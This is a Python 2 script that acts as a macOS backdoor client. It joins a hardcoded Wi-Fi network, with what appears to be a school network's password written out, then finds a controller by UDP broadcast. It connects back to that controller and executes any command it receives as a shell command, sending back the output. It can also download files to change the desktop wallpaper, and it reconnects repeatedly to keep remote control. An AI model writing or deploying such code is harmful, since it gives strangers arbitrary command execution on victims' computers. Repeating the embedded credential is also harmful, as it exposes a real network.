import subprocess
import socket
from time import sleep
import sys
import urllib

# initialize drugs

wifiConnection = 'networksetup -setairportnetwork en0 Fridaskolan vanersborg0521'
print wifiConnection.split()
subprocess.call(wifiConnection, shell=True)

sleep(3)


scanAddr = ('<broadcast>', 54545)
scan_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
scan_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

scanData = "Request"
scan_socket.sendto(scanData, scanAddr)

ip = ''
while True:
    recv_data, addr = scan_socket.recvfrom(2048)
    print addr,recv_data
    if addr != '':
        ip = addr[0]
        break
    scan_socket.sendto(scanData, scanAddr)


def handlecommand(string):
    special = False
    try:
        print string.split()[0]
        if string.split()[0] == """setbackground""":
            special = True
            if len(string.split()) is 3:
                filename = string.split()[2]
                f = open(filename, 'wb')
                f.write(urllib.urlopen(string.split()[1]).read())
                f.close()
                pwd = subprocess.check_output("pwd", shell=True)
                pwd = pwd[:-1]
                newstr = """sqlite3 ~/Library/Application\ Support/Dock/desktoppicture.db "update data set value = '""" + pwd + "/" + filename + """'";"""
                print newstr
                res = subprocess.check_output(newstr, shell=True)
                subprocess.check_output("killall Dock", shell=True)
    except:
        return "failed"
    if not special:
        res = subprocess.check_output(string, shell=True)
    return res


# setup steroids

# Define the port on which you want to connect
port = 6924
running = True


def newconnection():
    global running
    while running:
        # connect to the server on local computer
        try:
            sleep(2)
            # print "trying to connect"
            # Create a socket object
            s = socket.socket()
            s.connect((ip, port))
            # print "connected"

            while True:
                # receive data from the server
                res = s.recv(1024)
                print res
                if res == "stopLoop":
                    running = False
                    s.sendall(b"Loop stopped")
                elif res == "restartLoop":
                    running = True
                    s.sendall(b"Loop restarted")
                elif res is 'exit':
                    break
                else:
                    try:
                        answ = "\n" + str(handlecommand(res)) + "\nDone, now listening\n"
                        s.sendall(bytes(answ))
                    except Exception as e:
                        print e
                        try:
                            s.sendall(b"Error")
                        except Exception as e2:
                            print e2
                            break

            # close the connection
            s.close()
            # print "disconnected"
            newconnection()
        except:
            pass


newconnection()

